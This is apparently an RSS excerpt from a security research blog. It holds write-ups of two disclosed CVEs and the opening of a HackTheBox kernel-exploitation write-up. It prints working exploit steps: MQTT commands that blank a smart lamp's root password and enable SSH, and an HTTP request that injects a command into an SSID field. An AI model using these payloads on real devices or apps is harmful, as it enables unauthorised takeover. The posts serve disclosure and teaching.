$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /sbin/reboot&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><figcaption>A rewind to the PoC exploit payload commands</figcaption></figure><h3 id="investigating-the-communication-protocol">Investigating the communication protocol</h3><p>Now we have a primitive for our exploit: a debugging endpoint which could be abused if we could send messages on the <code>/acme/device/serialno/exec/server</code> channel of the MQTT broker. Mind you, it would cause CHAOS if this MQTT broker could be hacked to allow an attacker to send messages to all devices connected to the MQTT broker. Since we don&apos;t want to try to hack the vendor since it would be cybercrime, we aren&apos;t going to test the official MQTT broker, so we tried to find ways to MitM the traffic going to <code>mqtt.acme.org</code>, however we couldn&apos;t succeed since it used TLS... But - we asked ourselves - what if the TLS configuration was insecure? E.g. an insecure version?</p><p>In order to find the TLS configuration, we dug into the functions that were called to setup the MQTT client: <code>cloud_pipe_subscribe</code> and <code>cloud_pipe_start</code>. By running a simple <code>grep -iRe &apos;cloud_pipe_subscribe&apos;</code> query again, we can see that our function is originating from <code>/acme_config/acme_programs/libcloudpipe.so</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ grep -iRe &apos;cloud_pipe_subscribe&apos;
grep: lib/libcloudpipe.so: binary file matches
grep: acme_config/acme_programs/cloud_daemon: binary file matches
grep: acme_config/acme_programs/libcloudpipe.so: binary file matches
grep: sbin/cloud_daemon: binary file matches</code></pre><figcaption><code>grep</code> - utility for searching strings</figcaption></figure><p>An interesting part of the <code>cloud_pipe_start()</code> function is the subsystem where a TLS network connection gets initiated by <code>ConnectNetwork()</code> and the MQTTClient gets initiated by <code>MQTTClient()</code>. We can find the TLS configuration in <code>ConnectNetwork()</code> and I quickly identified the used TLS library as <a href="https://github.com/Mbed-TLS/mbedtls">mbedtls</a>. Whilst searching for documentation of the used functions in the mbedtls library, I found out that the parameter <code>MBEDTLS_SSL_VERIFY_NONE</code> gets passed to the configuration function <code>mbedtls_ssl_conf_authmode</code>. This means that <strong>TLS certifications are not validated...</strong></p><figure class="kg-card kg-code-card"><pre><code class="language-c">  sprintf(port_str,&quot;%d&quot;,port);
  printf(&quot;  . Connecting to %s:%s...&quot;,addr,port_str);
  fd_stdout = stdout;
  fflush(stdout);
  param1 = mbedtls_net_connect(&amp;ctx_net,addr,port_str,0);
  if (param1 != 0) {
    printf(&quot; failed\n  ! mbedtls_net_connect returned %d\n\n&quot;,param1);
    return -1;
  }
  puts(&quot; ok&quot;);
  initiated_seed = 0;
  printf(&quot;  . Setting up the SSL/TLS structure...&quot;);
  fflush(fd_stdout);
  pcVar4 = (char *)0x0;
  pcVar3 = (code *)0x0;
  success = mbedtls_ssl_config_defaults((undefined4 *)&amp;ssl_config,0,0,0);
  if ((int *)success == (int *)0x0) {
    puts(&quot; ok&quot;);

    // mbedtls_ssl_conf_authmode() - Set the certificate verification mode
    // 
    // #define MBEDTLS_SSL_VERIFY_NONE 0
    mbedtls_ssl_conf_authmode((int)&amp;ssl_config,0);
    mbedtls_ssl_conf_rng(ssl_config, mbedtls_ctr_drbg_random, &amp;ctx_ctr_drbg_init);
    pcVar3 = (code *)fd_stdout;
    mbedtls_ssl_conf_dbg((int)&amp;ssl_config,&amp;LAB_0002d068,fd_stdout);
    success = mbedtls_ssl_setup((undefined4 *)&amp;DAT_00100838,&amp;ssl_config);</code></pre><figcaption><code>ConnectNetwork()</code> - create the TLS connection to a server</figcaption></figure><p>We have the final piece.</p><h2 id="creating-a-proof-of-concept-exploit">Creating a Proof of Concept exploit</h2><p>The primitives in our exploit are complete: we have a dangerous debugging endpoint listening to a server which can be eavesdropped. Now it&apos;s a matter of performing a Man-in-the-Middle (MitM) attack on the MQTT broker and creating a payload to send.</p><p>We have plenty of options to MitM network traffic when the TLS certifications aren&apos;t verified, but our favorite approach is using a rogue DHCP server to serve fake DNS records. We picked the <code>isc-dhcp-server</code> DHCP service because it works on Linux and because it&apos;s very customizable. We&apos;re using option <code>domain-name-server</code> to set the DNS server to <code>192.168.128.10</code> on the smart lamp. This means that if the lamp requests <code>mqtt.acme.org</code>, it will be resolved by our own DNS resolver over at <code>192.168.128.10</code></p><p>We used <code>bind9</code> as a DNS resolver in order to create fake DNS zones/records. We created a basic type A (IPv4) DNS record for <code>mqtt.acme.org</code> which redirects to our own MQTT broker <code>192.168.128.10</code>. Usually these kind of attacks are prevented by verifying the TLS certifications of the broker as a client, but the smart lamp did not perform those verification checks. </p><p>For the final serice we needed an MQTT broker, for which we chose <code>mosquitto</code>. We didn&apos;t configure it at all and just made sure that it was possible to publish and subscribe to any MQTT channels. However, we had to make sure that our service was running on port 443 (which is typically used for HTTPS), that it supported TLS, and that anonymous logins were allowed (anonymous login means that any username/password is allowed to login). </p><p>Now we have our entire infrastructure up and running, we need to send the payload commands to our own MQTT broker. We can easily use the <code>mosquitto_pub</code> utility for this to publish our own messages to specific channels. Additionally, we can use the <code>mosquitto_sub</code> utility for subscribing to other channels so that we can receive stdout from the smart lamp. In order to easily get our very own OpenSSH server we need to create a file called <code>/acme_config/ssh_enabled</code> and reboot. However, <code>root</code> is the only user with a default shell (<code>/bin/ash</code>) &#xA0;but we don&apos;t know its password. </p><figure class="kg-card kg-code-card"><pre><code>$ cat etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false</code></pre><figcaption><code>/etc/passwd</code> - contains user information</figcaption></figure><p>We can overwrite the root password using <code>passwd -d</code> which resets the password to be empty, and the OpenSSH will gladly accept that. This means that we can essentially start an OpenSSH server using <code>touch /acme_config/ssh_enabled &amp;&amp; passwd -d &amp;&amp; reboot</code>. However, in practice our commands get executed using <code>execv(char* filepath, char** argv)</code>. This means that we need to execute the commands seperately with the full path. Hence, our payload is as follows:</p><pre><code class="language-bash">$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/touch /acme/ssh_enabled&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /bin/passwd -d root&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;stop&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt
$ mosquitto_pub -L mqtts://127.0.0.1:443/acme/device/serialno/exec/server -m &quot;debug /sbin/reboot&quot; --insecure --cafile /etc/mosquitto/certs/ca.crt</code></pre><p>When we execute this, we start the OpenSSH server and we can log in as root:</p><pre><code class="language-bash">$ ssh root@192.168.128.20

root@192.168.128.20:~$ whoami
root</code></pre><h2 id="conclusion">Conclusion</h2><p>As we have discovered in this article, a critical vulnerability was found in many, many IoT smart lighting devices, allowing attackers to gain control over the entire device and access sensitive information. This serves as a reminder of the importance of IoT security for both vendors and consumers.</p><p>As consumers, we can follow these best practices to enhance the security of our home network:</p><ol><li>Keep devices&apos; software up-to-date to prevent vulnerabilities from being exploited.</li><li>Keep smart devices on a separate sub-network to reduce privacy concerns.</li><li>Use long passwords (even pass-sentences) and two-factor authentication where possible.</li><li>Disable unused or unnecessary services and ports on devices.</li></ol><p>As developers, we can implement the following best practices to ensure the security of our IoT devices:</p><ol><li>Conduct thorough security assessments and penetration testing to identify and fix vulnerabilities before deploying devices.</li><li>Implement encryption and authentication mechanisms to secure data transmitted between the device and the server.</li><li>Use secure coding practices and avoid insecure software libraries.</li><li>Regularly update and patch devices to fix security vulnerabilities (and do it fast :-) ).</li></ol><p>By following these best practices, we can reduce the risk of security breaches and ensure the safety and security of our connected devices and home networks.</p><p>Furthermore, the vulnerabilities in said smart lamps were patched by the vendor in early January 2023, about a month after coordinated vulnerability disclosure. The vendor gave us explicit permission to publish this blogpost - under the agreement we wouldn&apos;t mention the vendors name nor product name - and gave us permission to publish <code>CVE-2022-47758</code>. </p><p></p><p>We hope this blogpost has been as interesting to read for you as it was for us to write, and thank you for taking the time to read this blogpost.</p><p>Notselwyn, March 2023</p>]]></content:encoded></item><item><title><![CDATA[How I hacked IoT management apps: the story behind CVE-2022-46640]]></title><description><![CDATA[<p>Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,</p>]]></description><link>https://pwning.tech/cve-2022-46640/</link><guid isPermaLink="false">658f44f8d32e980001de21f0</guid><category><![CDATA[Web Exploitation]]></category><category><![CDATA[Real World]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Wed, 08 Mar 2023 07:30:00 GMT</pubDate><content:encoded><![CDATA[<p>Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost, we&apos;re going to share our experience hacking into a desktop app with a very large number of downloads, and explain how we were able to do it. Whether you&apos;re a developer, a security researcher, or just someone curious about software security, you won&apos;t want to miss this interesting write-up. So, let&apos;s dive in!</p><h2 id="content">Content</h2><ol><li>Introduction to IoT desktop apps</li><li>Proof of Concept exploit</li><li>Analyzing the IoT desktop app</li><li>Creating a Proof of Concept exploit</li><li>Conclusion</li></ol><h2 id="introduction-to-iot-desktop-apps">Introduction to IoT desktop apps</h2><p>Smart lighting has evolved beyond just mobile apps. With the rise of desktop apps, managing smart lights has become even more convenient. Desktop apps for smart lighting allow users to manage their smart lights from their computers, with some apps offering unique features like a more user-friendly interface or advanced automation options.</p><p>Desktop apps for smart lighting can pose security risks, including potential vulnerabilities that hackers could exploit to <a href="https://pwning.tech/cve-2022-47758">gain access to a user&apos;s smart lights</a> and even the desktop itself... To minimize these risks, users should download apps from trusted sources, and especially update apps and operating systems regularly. Additionally users can separate IoT networks from normal networks.</p><p>The desktop app we managed to exploit was written in Electron with an back-end server written in Express.js. The back-end Express.js server was accessible from any device which meant that remote exploitation was possible. &#xA0;</p><h2 id="proof-of-concept-exploit">Proof of Concept exploit</h2><p>In order to exploit the command injection vulnerability (which leads to unauthenticated RCE) we can send a mere HTTP request as Proof of Concept (PoC). The root cause is a command injection vulnerability in an unauthenticated Express.js API endpoint on the device that changes the active WiFi network. This &quot;intended&quot; WiFi reconfiguration functionality itself is an RWR vulnerability because an attacker can set up their own malicious WiFi network and make the target device connect to it to eavesdrop it.</p><p>The code that causes this command injection vulnerability is located in the Windows WiFi network subsystem of the application. We can supply a malicious access point SSID in the HTTP request which allows us to inject our own commands into <code>execCommand()</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log(&quot;using windows wifi handler&quot;);
    return scan().then((networks) =&gt; { ...
    }).then(() =&gt; {
        return execCommand(&apos;netsh wlan add profile filename=&quot;nodeWifiConnect.xml&quot;&apos;);
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid=&quot;${ap.name}&quot; name=&quot;${ap.name}&quot;`);
    }).then(() =&gt; { ...
    }).catch((err) =&gt; {
        console.warn(&quot;windowsWifi connectToWifi Error:&quot;, err);
        return execCommand(`netsh wlan delete profile &quot;${ap.name}&quot;`).then(() =&gt; {
            return Promise.reject(err);
        });
    });
}</code></pre><figcaption><code>connect(ap)</code> - the code that contains the command injection vulnerability</figcaption></figure><p>The payload in the malicious HTTP request is a JSON body including the new WiFi SSID and the new WiFi password. We can supply an SSID that escapes the command <code>netsh wlan delete profile &quot;${ap.name}&quot;</code> to exploit it. An example of such SSID is <code>{&quot;name&quot;: &quot;\&quot;&amp;calc.exe&amp;::&quot;}</code> - in which <code>&amp;</code> is used to background the command and <code>::</code> to comment out everything that follows.</p><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
Content-Length: 75
Content-Type: application/json

{&quot;new_network&quot;:{&quot;name&quot;:&quot;attacker_ssid&quot;,&quot;password&quot;:&quot;attacker_pass&quot;}}</code></pre><figcaption>HTTP request for the typical credential check</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
Content-Length: 75
Content-Type: application/json

{&quot;new_network&quot;:{&quot;name&quot;:&quot;\&quot;&amp;calc.exe&amp;::&quot;,&quot;password&quot;:&quot;attacker_pass&quot;}}</code></pre><figcaption>HTTP request containing our own payload which executes calc.exe</figcaption></figure><p>This proof of concept payload spawns the Windows calculator on the desktop of the vulnerable target device. According to our research it is possible to make a fully fletched shell that can upload files, download files, and execute commands all while using native vulnerabilities we found in the app. Those vulnerabilities like LFI, LFW, et cetera have been patched by the vendor due to our research as well.</p><h2 id="analyzing-the-iot-desktop-app">Analyzing the IoT desktop app</h2><p>In order to find vulnerabilities in the desktop app, we need to get our hands on the code. To find the relevant code, I tried searching in the app directory for strings that get shown when running the app. If the app was a compiled PE executable we should still get results. Using <code>grep -iRe &quot;Sign In&quot;</code> we can find the file <code>app.asar</code>. An ASAR file turns out to be a source code package for an Electron app. We found the <a href="https://github.com/electron/asar">asar</a> tool developed by Electron themselves and used it to extract the source code from the ASAR file using <code>asar e app.asar out</code>. </p><p>The first thing we researched when we got access to the source code was finding the entrypoint of the application. Since the project structure looked an aweful lot like an Express.js webserver, we started looking for the initialization of the webserver to find the host, port and routes. It turns out that the ports are provided in an environment and that the app listens to port 56751 and binds to 0.0.0.0 (due to its lack of providing an interface). </p><p>The fact that the server binds to 0.0.0.0 is the root cause of all vulnerabilities listed in this blogpost. Because the interface doesn&apos;t bind to just localhost (a.k.a. 127.0.0.1), any device on the network can connect to the webserver. This is fundamentally not necessary in this usecase and it&apos;s making exploitation possible from other devices. If the server binded to 127.0.0.1 instead, there wouldn&apos;t be RCE since remote devices would be able to communicate with the webserver. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">  production: {
    env: &apos;production&apos;,
    root: rootPath,
    app: {
      name: &apos;device-monitor-server&apos;
    },
    port: 56751,
    redis: {
        host: process.env.REDIS_ADDRESS,
        port: 6379
    }
  }</code></pre><figcaption><code>config/config.js</code> - containing information about the environment</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">
global.App = {
    app: app,
    env: env,
    server: http.createServer(app),
    config: require(&apos;./config/config&apos;),
    port: require(&apos;./config/config&apos;).port,
    // ...
    start: function() {
        if (!this.started) {
            // ...
            this.server.listen(this.port)
            console.log(&quot;Operating System :&quot;, process.platform);
            console.log(&quot;Running App Version &quot; + App.version + &quot; on port &quot; + App.port + &quot; in &quot; + App.env + &quot; mode&quot;)
        }
    }
}
</code></pre><figcaption><code>application.js</code> <code>-</code> binding to <code>0.0.0.0:56751</code></figcaption></figure><p>Since we found out that the webserver binds to 0.0.0.0:56751, we can now start looking for API routes, since the Electron app uses those to manage the smart lights. After running a few grep queries for &quot;routes&quot;, we found <code>config/routes.js</code>. This file contains more than 60 API routes from actions like managing the smart devices to changing WiFi settings on the host. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">// ...

app.get(&apos;/network/info&apos;, EncryptionController.getCurrentNetworkInfo);
app.post(&apos;/network/reconnect&apos;, EncryptionController.reconnectToNetwork);
app.get(&apos;/wides&apos;, EncryptionController.getWifis);

app.post(&apos;/validateWifiPassword&apos;, EncryptionController.validateWifiPassword);

app.post(&apos;/wac/device&apos;, dnssdController.enableWACMode, EncryptionController.connectDeviceToNetwork, dnssdController.disableWACMode, dnssdController.getDevices);

// ...</code></pre><figcaption><code>config/routes.js</code> - containing the routes of the app</figcaption></figure><p>We analysed nearly all 60 endpoints and found plenty of vulnerabilities - all of which can be exploited remotely because the server binds to <code>0.0.0.0</code>. We started analysing the endpoints with a priority on dangerous endpoints - the endpoints which call command execution functions. We searched for those using <code>grep -iRe &quot;execCommand&quot;</code>, which only gave <code>app/utils/windowsWifi.js</code> back. Analysing this file gave the following dangerous functions:</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function execCommand(cmd) {
    return new Promise((resolve, reject) =&gt; {
        exec(cmd, env, (err, stdout, stderr) =&gt; { /* ... */ });
    });
}</code></pre><figcaption><code>execCommand</code> - the primary dangerous function being used</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log(&quot;using windows wifi handler&quot;);
    return scan().then((networks) =&gt; { // ... 
    }).then(() =&gt; { // ...
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid=&quot;${ap.name}&quot; name=&quot;${ap.name}&quot;`);
    }).then(() =&gt; { // ...
    }).catch((err) =&gt; {
        console.warn(&quot;windowsWifi connectToWifi Error:&quot;, err);
        return execCommand(`netsh wlan delete profile &quot;${ap.name}&quot;`).then(() =&gt; { // ...
        });
    });
}</code></pre><figcaption><code>connect(ap)</code> - dangerous function containing</figcaption></figure><p>The function <code>connect(ap)</code> sticks out because it executes a command with user input injected into the command. If we could set <code>ap.name</code> to <code>&quot;&amp; calc&amp;</code>, we should be able to start <code>calc.exe</code> on the management desktop. In order to check whether or not we could control <code>ap.name</code> from a webrequest, we ran another grep query for <code>connect</code> and got results. </p><p>We found <code>validateWifiPassword(req, res)</code> which is a callback for <code>app.post(&apos;/validateWifiPassword&apos;, ...)</code>. This function calls <code>platformWifi.connect</code>, in which <code>platformWifi</code> is a class dependent on the OS of the host. If it is Windows, it calls the vulnerable <code>connect(ap)</code> function above - otherwise it will use a secure version. This means that only Windows is vulnerable. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">let platformWifi;

if (process.platform === &apos;win32&apos;) {
    // node-wifi does not work well for some operations on Windows, so import our own library for them
    platformWifi = require(&apos;../utils/windowsWifi&apos;);
} else {
    platformWifi = wifi;
}</code></pre><figcaption><code>platformWifi</code> - the selected WiFi library</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">function validateWifiPassword(req, res) {
    const new_network = req.body.new_network;
    if (!new_network.name || !new_network.password) {
        // ...
    }
    console.log(`Checking wifi creds for ${new_network.name}...`);

    const callback = (err) =&gt; {
        // ...
    };

    let accessPoint = { name: new_network.name, password: new_network.password };
    platformWifi.connect(accessPoint, callback);
}</code></pre><figcaption><code>validateWifiPassword()</code> - the API callback function</figcaption></figure><p>The <code>validateWifiPassword()</code> function requests the parameter <code>new_network</code> with subparameters <code>name</code> and <code>password</code>. These are passed directly into <code>platformWifi.connect(accessPoint, callback)</code>, which means that there&apos;s a command injection vulnerability since we can supply an arbitrary SSID into the command <code>netsh wlan connect ssid=&quot;${ap.name}&quot;</code>.</p><h2 id="creating-a-proof-of-concept-exploit">Creating a Proof of Concept exploit</h2><p>We have vision on our exploitable primitives: command injection through an HTTP request sent to the API endpoint <code>POST /validateWifiPassword</code> hosted on a webserver that binds to 0.0.0.0:56751. Let&apos;s go through it from start to finish.</p><p>We&apos;re starting the exploit by sending a request to the following Express.js API endpoint that binds to 0.0.0.0:56751. The API endpoint triggers a call to <code>EncryptionController.validateWifiPassword()</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">app.post(&apos;/validateWifiPassword&apos;, EncryptionController.validateWifiPassword);
</code></pre><figcaption>The API endpoint registration including its callback function</figcaption></figure><p>The <code>validateWifiPassword()</code> function is a wrapper for sanitizing the user input and handling request output. The user input is expected in the HTTP body and is expected to have the form of <code>new_network.name</code> (for the WiFi SSID) and <code>new_network.password</code> (for the WiFi password). The easiest way to do this is using a JSON structure like <code>{&quot;new_network&quot;:{&quot;name&quot;:&quot;ABC&quot;,&quot;password&quot;:&quot;XYZ&quot;}}</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">function validateWifiPassword(req, res) {
    const new_network = req.body.new_network;
    if (!new_network.name || !new_network.password) {
        console.error(&quot;Invalid request object.&quot;);
        return res.sendStatus(422);
    }
    console.log(`Checking wifi creds for ${new_network.name}...`);

    const callback = (err) =&gt; {
        if (err) {
            // ...
        }
        console.log(&quot;Successfully connected  to&quot;, new_network.name);
        return res.sendStatus(204);
    };

    let accessPoint = { name: new_network.name, password: new_network.password };
    platformWifi.connect(accessPoint, callback);
}
</code></pre><figcaption><code>validateWifiPassword()</code> - the IO wrapper around <code>wifi.connect()</code></figcaption></figure><p>Next, the function <code>windowsWifi.connect()</code> gets called. This function calls the dangerous <code>execCommand</code> function plenty of times using user controllable input. Specifically, <code>new_network.name</code> gets used for the command injection. This means that we have to inject a payload as <code>new_network.name</code> to achieve RCE on the webserver.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log(&quot;using windows wifi handler&quot;);
    return scan().then((networks) =&gt; { ...
    }).then(() =&gt; {
        return execCommand(&apos;netsh wlan add profile filename=&quot;nodeWifiConnect.xml&quot;&apos;);
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid=&quot;${ap.name}&quot; name=&quot;${ap.name}&quot;`);
    }).then(() =&gt; { ...
    }).catch((err) =&gt; {
        console.warn(&quot;windowsWifi connectToWifi Error:&quot;, err);
        return execCommand(`netsh wlan delete profile &quot;${ap.name}&quot;`).then(() =&gt; {
            return Promise.reject(err);
        });
    });
}</code></pre><figcaption><code>connect()</code> - the function containing vulnerable code</figcaption></figure><p>We&apos;re dealing with the command <code>netsh wlan connect ssid=&quot;${ap.name}&quot; name=&quot;${ap.name}&quot;</code> and we can control <code>${ap.name}</code>. We want to execute the Windows calculator (calc.exe) to get a graphical proof of concept on the vulnerable device. To do this, we need to escape the quotes of the command and ignore the rest of the command. This would look something like <code>netsh wlan connect ssid=&quot;&quot;&amp;calc.exe&amp;::&quot; name=&quot;&quot;&amp;calc.exe&amp;::&quot;</code>where only <code>netsh wlan connect ssid=&quot;&quot;&amp; calc.exe&amp;</code> gets executed since <code>::</code> makes the rest of the line a comment. We use &amp; to background the task, so <code>netsh wlan connect ssid=&quot;&quot;</code> can fail in the background whilst <code>calc.exe</code> can succeed in the background. This means that we need to make our SSID <code>&quot;&amp;calc.exe&amp;::</code>. The entire HTTP request would become as follows. </p><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
content-type: application/json
Content-Length: 61

{&quot;new_network&quot;:{&quot;name&quot;:&quot;\&quot;&amp;calc.exe&amp;::&quot;,&quot;password&quot;:&quot;xyz&quot;}}</code></pre><figcaption>The PoC payload executing <code>calc.exe</code> on the target device</figcaption></figure><h2 id="conclusion">Conclusion</h2><p>In conclusion, we exploited a command injection vulnerability by sending an HTTP request to a remote vulnerable Express.js API webserver that binds to all interfaces. Our internal research concluded that it&apos;s possible to make a fully fletched shell using vulnerabilities in this app, that could upload/download files and execute commands which would make it ideal for attackers. </p><p>The mitigations for these vulnerabilities would be as follows: only bind to interfaces that need access (in this case 127.0.0.1) to prevent remote access all together; sanitize controllable user input (especially when executing commands); disable remote wireless reconfiguration all together to prevent MitM attacks; disable arbitrary file operations (c.q. reading and writing) as it will only introduce vulnerabilities. </p><p>Going forward, we recommend users to keep their software up-to-date as vendors continuously release patches for vulnerabilities like those shown in this blogpost. Additionally we recommend more advanced users to use firewalls on their devices, which should deny incoming traffic by default as it can prevent lots of vulnerabilities. </p><p>Furthermore, the vulnerabilities in said desktop app were patched by the vendor in December 2022, a month after coordinated vulnerability disclosure (CVD). The vendor gave us explicit permission to publish this blogpost (under the agreement we wouldn&apos;t mention the vendors name nor desktop app name) and to publish <code>CVE-2022-46640</code>. </p><p></p><p>We hope you learned reading this blogpost as much as we did researching the vulnerabilities, and thank you for taking the time to read this blogpost.</p><p>Notselwyn, March 2023</p>]]></content:encoded></item><item><title><![CDATA[Knote (HackTheBox)]]></title><description><![CDATA[<p>Heya infosec folks, in this write-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTheBox. We can trigger a <strong>local privilege escalation</strong> attack by exploiting a <strong>use-after-free </strong>bug. The description of the challenge is as follows:</p><blockquote>Secure your secrets in the kernel space!</blockquote><h2 id="summary">Summary</h2><ul><li>What are kernel modules?</li><li>How</li></ul>]]></description><link>https://pwning.tech/knote/</link><guid isPermaLink="false">658f44f8d32e980001de21ed</guid><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[Linux Syscalls]]></category><category><![CDATA[x64 Assembly]]></category><category><![CDATA[Linux Kernel]]></category><category><![CDATA[Heap Memory]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Sun, 15 Jan 2023 23:21:55 GMT</pubDate><content:encoded><![CDATA[<p>Heya infosec folks, in this write-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTheBox. We can trigger a <strong>local privilege escalation</strong> attack by exploiting a <strong>use-after-free </strong>bug. The description of the challenge is as follows:</p><blockquote>Secure your secrets in the kernel space!</blockquote><h2 id="summary">Summary</h2><ul><li>What are kernel modules?</li><li>How does this kernel CTF work?</li><li>Analyzing the kmodule</li><li>Finding primitives</li><li>Creating an exploit</li><li>Creating a real world version</li></ul><h2 id="what-are-kernel-modules">What are kernel modules?</h2><p>Linux kernel modules are a way to extend the Linux kernel in a hotswappable way. Kernel modules are also used for creating drivers, which is why it&apos;s useful to learn how to exploit them. Thankfully, you can use the same pwn / exploitation techniques in kernel modules as in the core Linux kernel.</p><p>Kernel modules (kmodules) can do a lot of things that the core kernel can do as well: manage a virtual filesystem such as <code>/proc</code>, manage task structs, et cetera. They can register a device file as well, which you can use to communicate with the kmodule using read(), write(), ioctl(), et cetera. </p><p>You can insert, list, and remove kernel modules by respectively using the binaries <code>insmod</code>, <code>lsmod</code>, and <code>rmmod</code>. </p><h2 id="how-do-kernel-pwn-ctfs-work">How do kernel pwn CTFs work?</h2><p>The goal of most kernel pwn CTFs are local privilege escalation exploits, in which a user becomes root in order to read a root-only flag file. Typically, you will be given 3 files: </p><ul><li><code>qemu.sh</code>: a BASH script to run a QEMU command. QEMU (Quick EMUlator) is a FOSS instructionset simulator which you can use to run custom Linux kernels in custom filesystems. It may sound like a VM, but it is not. </li><li><code>initramfs.cpio.gz</code> / <code>rootfs.img</code>: the custom (compressed) filesystem to run QEMU with. </li><li><code>bzImage</code> : the custom Linux kernel to run QEMU with. </li></ul><p>Make sure to remove <code>-no-kvm</code> from <code>qemu.sh</code> as it is for old versions of Qemu. Also <strong>note that there&apos;s no kaslr, no smap, no smep, etc</strong>. </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

timeout --foreground 35 qemu-system-x86_64 -m 128M \
  -kernel ./bzImage \
  -append &apos;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&apos; \
  -monitor /dev/null \
  -initrd ./initramfs.cpio.gz \
  -cpu qemu64 \
  -smp cores=1 \
  -nographic
</code></pre><figcaption><p><span style="white-space: pre-wrap;">qemu.sh content</span></p></figcaption></figure><p>Now you might see that I use <code>initramfs.cpio.gz</code> instead of the <code>initramfs.cpio.gz</code> which is supplied in the challenge. This is because I first extracted it using <code>cpio -iF rootfs.img</code>. After that, I used the following scripts to compress and decompress the resulting directory:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

if [ &quot;$1&quot; = &quot;&quot; ]; then
    echo &quot;usage: $0 &lt;initramfs.cpio.gz&gt;&quot;;
else

    # Decompress a .cpio.gz packed file system
    mkdir initramfs
    pushd . &amp;&amp; pushd initramfs
    cp ../$1 .
    gzip -dc $1 | cpio -idm &amp;&gt;/dev/null &amp;&amp; rm $1
    popd
fi
</code></pre><figcaption><p><span style="white-space: pre-wrap;">decompress.sh</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

# Compress initramfs with the included statically linked exploit
in=$1
out=$(echo $in | awk &apos;{ print substr( $0, 1, length($0)-2 ) }&apos;)
musl-gcc $in -static -pie -s -O0 -fPIE -o $out || exit 255
mv $out initramfs
pushd . &amp;&amp; pushd initramfs
find . -print0 | cpio --null --format=newc -o 2&gt;/dev/null | gzip -9 &gt; ../initramfs.cpio.gz
popd
</code></pre><figcaption><p><span style="white-space: pre-wrap;">compress.sh</span></p></figcaption></figure><p>So firstly I create an <code>initramfs.cpio.gz</code> for QEMU using <code>irfs_compress.sh initramfs/exploit.c &amp;&amp; ./qemu-cmd.sh</code>. Now, we can test QEMU by running <code>./qemu.sh</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">sh: can&apos;t access tty; job control turned off
~ $ whoami
user
~ $</code></pre><figcaption><p><span style="white-space: pre-wrap;">Qemu proof-of-concept (PoC)</span></p></figcaption></figure><h2 id="analyzing-the-kmodule">Analyzing the kmodule</h2><p>We are given the following C sourcecode of the <code>knote.ko</code> kernel module:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;linux/kernel.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/device.h&gt;
#include &lt;linux/mutex.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/slab.h&gt;
#include &lt;linux/uaccess.h&gt;

#define DEVICE_NAME &quot;knote&quot;
#define CLASS_NAME &quot;knote&quot;

MODULE_AUTHOR(&quot;r4j&quot;);
MODULE_DESCRIPTION(&quot;Secure your secrets in the kernelspace&quot;);
MODULE_LICENSE(&quot;GPL&quot;);

static DEFINE_MUTEX(knote_ioctl_lock);
static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

static int major;
static struct class *knote_class  = NULL;
static struct device *knote_device = NULL;
